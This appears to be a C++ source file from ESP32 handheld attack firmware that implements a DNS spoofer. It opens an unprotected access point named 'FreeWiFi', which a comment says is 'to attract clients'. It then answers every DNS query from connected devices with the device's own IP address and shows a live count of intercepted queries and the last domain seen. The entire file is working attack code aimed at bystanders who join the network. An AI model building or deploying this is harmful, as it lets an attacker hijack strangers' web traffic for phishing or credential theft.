// ═══════════════════════════════════════════════════════════
// Arsenal - DNS Spoofer
// Redirects DNS queries to our IP when running as AP
// All domains or specific targets can be redirected
// ═══════════════════════════════════════════════════════════

#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_task_wdt.h>
#include <globals.h>

static WiFiUDP dnsUDP;
static bool dnsRunning = false;
static int queriesIntercepted = 0;
static String lastDomain = "";

// DNS header structure
struct DNSHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

static String parseDomainName(uint8_t *data, int offset, int len) {
    String domain = "";
    int pos = offset;
    while (pos < len && data[pos] != 0) {
        int labelLen = data[pos];
        pos++;
        for (int i = 0; i < labelLen && pos < len; i++) {
            domain += (char)data[pos];
            pos++;
        }
        if (data[pos] != 0) domain += ".";
    }
    return domain;
}

static void sendDNSResponse(uint8_t *query, int queryLen, IPAddress clientIP, uint16_t clientPort, IPAddress spoofIP) {
    if (queryLen < 12) return;

    // Build response based on query
    uint8_t response[512];
    int respLen = 0;

    // Copy header
    memcpy(response, query, 12);
    respLen = 12;

    // Set response flags: QR=1, AA=1, RA=1
    response[2] = 0x84;  // QR=1, Opcode=0, AA=1
    response[3] = 0x00;  // RA=0, RCODE=0

    // Set answer count to 1
    response[6] = 0x00;
    response[7] = 0x01;

    // Copy question section
    int qEnd = 12;
    while (qEnd < queryLen && query[qEnd] != 0) {
        qEnd += query[qEnd] + 1;
    }
    qEnd += 5;  // null byte + QTYPE(2) + QCLASS(2)

    memcpy(response + 12, query + 12, qEnd - 12);
    respLen = qEnd;

    // Answer section
    // Name pointer to question
    response[respLen++] = 0xC0;
    response[respLen++] = 0x0C;
    // Type A
    response[respLen++] = 0x00;
    response[respLen++] = 0x01;
    // Class IN
    response[respLen++] = 0x00;
    response[respLen++] = 0x01;
    // TTL (60 seconds)
    response[respLen++] = 0x00;
    response[respLen++] = 0x00;
    response[respLen++] = 0x00;
    response[respLen++] = 0x3C;
    // Data length (4 for IPv4)
    response[respLen++] = 0x00;
    response[respLen++] = 0x04;
    // IP address
    response[respLen++] = spoofIP[0];
    response[respLen++] = spoofIP[1];
    response[respLen++] = spoofIP[2];
    response[respLen++] = spoofIP[3];

    dnsUDP.beginPacket(clientIP, clientPort);
    dnsUDP.write(response, respLen);
    dnsUDP.endPacket();
}

void arsenal_dns_spoofer(void) {
    ARSENAL_SAFE_RUN([]() {
        // Must be running as AP
        if (WiFi.getMode() != WIFI_MODE_AP && WiFi.getMode() != WIFI_MODE_APSTA) {
            // Start AP mode
            WiFi.mode(WIFI_AP);
            WiFi.softAP("FreeWiFi", "");  // open network to attract clients
            delay(100);
        }

        IPAddress myIP = WiFi.softAPIP();
        dnsUDP.begin(53);
        dnsRunning = true;
        queriesIntercepted = 0;

        while (dnsRunning) {
            drawMainBorderWithTitle("DNS Spoofer");

            int padX = 12;
            int y = 45;

            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("Status: ACTIVE");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Spoofing to: " + myIP.toString());
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Queries intercepted: %d", queriesIntercepted);
            y += 14;

            tft.setCursor(padX, y);
            tft.print("AP: " + WiFi.softAPSSID());
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Clients: %d", WiFi.softAPgetStationNum());
            y += 18;

            if (lastDomain.length() > 0) {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                tft.setCursor(padX, y);
                tft.print("Last: " + lastDomain.substring(0, 24));
            }

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);

            // Process DNS queries
            int packetSize = dnsUDP.parsePacket();
            if (packetSize > 0) {
                uint8_t buffer[512];
                int len = dnsUDP.read(buffer, sizeof(buffer));
                if (len >= 12) {
                    lastDomain = parseDomainName(buffer, 12, len);
                    sendDNSResponse(buffer, len, dnsUDP.remoteIP(), dnsUDP.remotePort(), myIP);
                    queriesIntercepted++;
                }
            }

            if (check(EscPress)) {
                dnsRunning = false;
                break;
            }

            esp_task_wdt_reset();
            delay(50);
        }

        dnsUDP.stop();
        displayRedStripe("DNS Spoofer stopped");
        delay(1000);
    });
}
